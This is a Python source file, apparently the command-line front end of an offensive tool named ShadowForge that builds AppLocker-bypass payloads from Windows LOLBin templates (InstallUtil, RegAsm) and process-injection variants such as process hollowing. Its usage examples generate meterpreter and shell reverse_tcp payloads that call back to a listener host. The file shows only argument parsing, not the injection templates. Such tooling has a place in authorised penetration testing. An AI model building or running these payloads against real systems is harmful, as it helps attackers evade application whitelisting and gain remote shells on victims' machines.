import argparse
from colorama import Fore, Style

TOOL_NAME = "ShadowForge"

# Available LOLBin / injection-variant templates (must match files in cs_templates/)
AVAILABLE_BINARIES = [
    'InstallUtil',
    'RegAsm',
    'ProcessHollow',
    'ProcessHollow2',
    'NTMapInjection-AV',
    'NativeProcInjection-AV',
]

# Injection techniques pulled from injection_techniques.yml
# (only consumed by InstallUtil/RegAsm — standalone templates hard-code their own logic)
AVAILABLE_TECHNIQUES = ['Shellcode-Loader', 'Process-Hollowing']


def show_banner():
    print(Fore.MAGENTA + Style.BRIGHT + r"""
 ____  _               _               _____
/ ___|| |__   __ _  __| | _____      _|  ___|__  _ __ __ _  ___
\___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / | |_ / _ \| '__/ _` |/ _ \
 ___) | | | | (_| | (_| | (_) \ V  V /|  _| (_) | | | (_| |  __/
|____/|_| |_|\__,_|\__,_|\___/ \_/\_/ |_|  \___/|_|  \__, |\___|
                                                     |___/      """)
    print()
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "  AppLocker bypass + process-injection payload forge")
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "  Author: Gnanaraj Mauviel  |  https://github.com/0xm3m")
    print()


show_banner()

parser = argparse.ArgumentParser(
    prog=TOOL_NAME,
    description=f'{TOOL_NAME} — Generate payloads using process-injection techniques for Living-off-the-Land AppLocker bypass binaries on Windows.',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=f"""available binaries:
  {', '.join(AVAILABLE_BINARIES)}

available injection techniques (InstallUtil / RegAsm only):
  {', '.join(AVAILABLE_TECHNIQUES)}

examples:
  ./{TOOL_NAME}.py -b InstallUtil,RegAsm -lh 10.0.0.1 -lp 4444 --payload windows/x64/meterpreter/reverse_tcp
  ./{TOOL_NAME}.py -b ProcessHollow --custom --hex-shellcode fc4881e4f0...
  ./{TOOL_NAME}.py -b NTMapInjection-AV -lh 10.0.0.1 -lp 443 --payload windows/x64/shell_reverse_tcp
""",
)

# Target / output
target = parser.add_argument_group('target')
target.add_argument('--binary', '-b', required=True, dest='binary', metavar='NAME[,NAME...]',
                    help=f'Comma-separated list of templates to generate. Choices: {", ".join(AVAILABLE_BINARIES)}')
target.add_argument('--arch', required=False, dest='arch', choices=['x86', 'x64'], default='x64',
                    help='Target architecture (important for .dll payloads). Default: x64')

# Shellcode source
shellcode = parser.add_argument_group('shellcode source')
shellcode.add_argument('--custom', required=False, default=False, action='store_true', dest='custom',
                       help='Use a user-supplied hex shellcode instead of msfvenom (requires --hex-shellcode)')
shellcode.add_argument('--hex-shellcode', required=False, dest='shellcode', metavar='HEX',
                       help='Hex-encoded shellcode (msfvenom -f hex format). Required with --custom')

# msfvenom options
msf = parser.add_argument_group('msfvenom (used when --custom is not set)')
msf.add_argument('--listen-host', '-lh', required=False, metavar='IP', dest='lh',
                 help='LHOST for the msfvenom payload')
msf.add_argument('--listen-port', '-lp', required=False, metavar='PORT', dest='lp',
                 help='LPORT for the msfvenom payload')
msf.add_argument('--payload', required=False, metavar='windows/x64/meterpreter/reverse_tcp', dest='payload',
                 help='Msfvenom payload module')

# Injection logic (pluggable for InstallUtil/RegAsm only)
injection = parser.add_argument_group('injection (InstallUtil / RegAsm only)')
injection.add_argument('--technique', '-t', required=False, dest='injection_technique',
                       default='Shellcode-Loader', choices=AVAILABLE_TECHNIQUES,
                       help='Injection technique from injection_techniques.yml. Default: Shellcode-Loader')

args = parser.parse_args()

# --custom is mutually exclusive with msfvenom flags
if args.custom and (args.lh or args.lp or args.payload):
    parser.error("--custom cannot be combined with -lh / -lp / --payload (msfvenom flags).")

if args.custom and not args.shellcode:
    parser.error("--hex-shellcode is required when --custom is set.")

# When not using --custom, all three msfvenom flags must be present
if not args.custom and not (args.lh and args.lp and args.payload):
    parser.error("-lh, -lp, and --payload are all required when --custom is not set.")

binaries = [b.strip() for b in args.binary.split(",")]

unknown = [b for b in binaries if b not in AVAILABLE_BINARIES]
if unknown:
    parser.error(f"Unknown binary/binaries: {', '.join(unknown)}. Choices: {', '.join(AVAILABLE_BINARIES)}")

injection_technique = args.injection_technique.lower()
